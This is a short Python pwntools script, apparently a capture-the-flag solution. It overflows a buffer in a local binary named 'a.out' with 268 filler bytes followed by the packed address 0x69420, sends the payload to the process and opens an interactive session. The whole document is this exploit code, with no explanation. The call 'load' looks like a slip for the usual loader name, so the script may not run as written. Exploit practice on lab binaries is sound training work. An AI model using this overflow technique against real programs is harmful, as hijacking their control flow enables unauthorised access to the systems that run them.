from pwn import *

elf = load("a.out")

payload = b'A' * 268 + p32(0x69420)
print(str(payload))

io = process(elf.path)
print(io.recvline())
io.sendline(payload)
io.interactive()
